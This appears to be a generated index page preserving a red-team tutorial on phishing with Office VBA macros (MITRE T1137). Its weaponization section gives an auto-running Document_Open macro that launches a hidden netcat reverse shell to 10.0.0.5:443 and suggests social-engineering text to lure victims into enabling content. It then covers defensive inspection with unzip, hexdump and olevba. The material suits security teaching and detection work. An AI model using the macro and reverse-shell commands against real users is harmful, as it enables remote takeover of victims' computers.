---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# T1137: Phishing - Office Macros

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-initial-access-phishing-with-ms-office-t1137-office-vba-macros` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/phishing-with-ms-office/t1137-office-vba-macros.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [T1137: Phishing - Office Macros](../../topics/offensive-security/t1137-phishing-office-macros.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-initial-access-phishing-with-ms-office-t1137-office-vba-macros |
| name | T1137: Phishing - Office Macros |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/initial-access/phishing-with-ms-office/t1137-office-vba-macros.md |

## Preserved Source Material

````yaml
_asset_filenames:
- macro-ancestry.png
- macro-shell.png
- macro-victim.png
- macros-body (1).png
- macros-code.png
- macros-deflated.png
- macros-document-unzipped.png
- macros-filename.png
- macros-hex-shell.png
- macros-olevba.png
_body: "---\ndescription: Code execution with VBA Macros\n---\n\n# T1137: Phishing - Office Macros\n\nThis technique will\
  \ build a primitive word document that will auto execute the VBA Macros code once the Macros protection is disabled.\n\n\
  ## Weaponization\n\n1. Create new word document (CTRL+N)\n2. Hit ALT+F11 to go into Macro editor\n3. Double click into the\
  \ \"This document\" and CTRL+C/V the below:\n\n{% code title=\"macro\" %}\n```javascript\nPrivate Sub Document_Open()\n\
  \  MsgBox \"game over\", vbOKOnly, \"game over\"\n  a = Shell(\"C:\\tools\\shell.cmd\", vbHide)\nEnd Sub\n```\n{% endcode\
  \ %}\n\n{% code title=\"C:\\tools\\shell.cmd\" %}\n```csharp\nC:\\tools\\nc.exe 10.0.0.5 443 -e C:\\Windows\\System32\\\
  cmd.exe\n```\n{% endcode %}\n\nThis is how it should look roughly in:\n\n![](../../../.gitbook/assets/macros-code.png)\n\
  \nALT+F11 to switch back to the document editing mode and add a flair of social engineering like so:\n\n![](<../../../.gitbook/assets/macros-body\
  \ (1).png>)\n\nSave the file as a macro enabled document, for example a Doc3.dotm:\n\n![](../../../.gitbook/assets/macros-filename.png)\n\
  \n{% file src=\"../../../.gitbook/assets/Doc3.dotm\" %}\nDot3.dotm - Word Document with Embedded VBA Macros\n{% endfile\
  \ %}\n\n## Execution\n\nVictim launching the Doc3.dotm:\n\n![](../../../.gitbook/assets/macro-victim.png)\n\n...and enabling\
  \ the content - which results in attacker receiving a reverse shell:\n\n![](../../../.gitbook/assets/macro-shell.png)\n\n\
  ## Observations\n\nThe below graphic represents the process ancestry after the victim had clicked the \"Enable Content\"\
  \ button in our malicious Doc3.dotm document:\n\n![](../../../.gitbook/assets/macro-ancestry.png)\n\n## Inspection\n\nIf\
  \ you received a suspicious Office document and do not have any malware analysis tools, hopefully at least you have access\
  \ to a WinZip or 7Zip and Strings utility or any type of Hex Editor to hand.&#x20;\n\nSince Office files are essentially\
  \ ZIP archives (PK magic bytes):\n\n```bash\nroot@remnux:/home/remnux# hexdump -C Doc3.dotm | head -n1\n00000000  50 4b\
  \ 03 04 14 00 06 00  08 00 00 00 21 00 cc 3c  |PK..........!..<|\n```\n\n...the file Dot3.dotm can be renamed to **Doc3.zip**\
  \ and simply unzipped like a regular ZIP archive. Doing so deflates the archive and reveals the files that make up the malicious\
  \ office document. One of the files is the `document.xml` which is where the main document body text goes and `vbaProject.bin`\
  \ containing the evil macros themselves:\n\n![](../../../.gitbook/assets/macros-deflated.png)\n\nLooking inside the `document.xml`,\
  \ we can see the body copy we inputted at the very begging of this page in the [Weaponization](t1137-office-vba-macros.md#weaponization)\
  \ section:\n\n![](../../../.gitbook/assets/macros-document-unzipped.png)\n\nAdditionally, if you have the strings or a hex\
  \ dumping utility, you can pass the `vbaProject.bin` through it. This can sometimes give you as defender enough to determine\
  \ if the document is suspicious/malicious.&#x20;\n\nRunning `hexdump -C vbaProject.bin` reveals some fragmented keywords\
  \ that should immediately raise your suspicion - **Shell, Hide, Sub\\_Open** and something that looks like a file path:\n\
  \n![](../../../.gitbook/assets/macros-hex-shell.png)\n\nIf you have a malware analysis linux distro Remnux, you can easily\
  \ inspect the VBA macros code contained in the document by issuing the command `olevba.py filename.dotm`. As seen below,\
  \ the command nicely decodes the `vbaProject.bin`  and reveals the actual code as well as provides some interpretation of\
  \ the commands found in the script:\n\n![](../../../.gitbook/assets/macros-olevba.png)\n\n{% hint style=\"danger\" %}\n\
  Note that the olevba can be fooled as per [http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen](http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen)\n\
  {% endhint %}\n\n## References\n\n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1137\" %}"
_relative_path: offensive-security/initial-access/phishing-with-ms-office/t1137-office-vba-macros.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/phishing-with-ms-office/t1137-office-vba-macros.md
````
